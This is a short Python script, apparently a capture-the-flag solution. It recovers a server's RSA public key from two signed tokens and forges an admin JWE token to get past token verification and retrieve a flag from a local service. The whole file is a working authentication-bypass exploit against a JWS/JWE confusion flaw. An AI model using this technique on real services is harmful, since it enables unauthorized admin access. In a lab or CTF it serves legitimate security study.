import requests
import json
import jws2pubkey  # https://github.com/SecuraBV/jws2pubkey
from joserfc import jwk, jwe

url = "http://localhost:5000"
t1 = requests.get(url + "/hello").json()["token"]
t2 = requests.get(url + "/hello").json()["token"]

public_key = jwk.RSAKey.import_key(json.loads(jws2pubkey.find_jws_pubkey(t1, t2)))
jwe_token = jwe.encrypt_compact({"alg": "RSA-OAEP", "enc": "A256CBC-HS512"}, b'{"user": "admin"}', public_key)

flag = requests.post(url + "/verify", json={"token": jwe_token}).json()["msg"]
print(flag)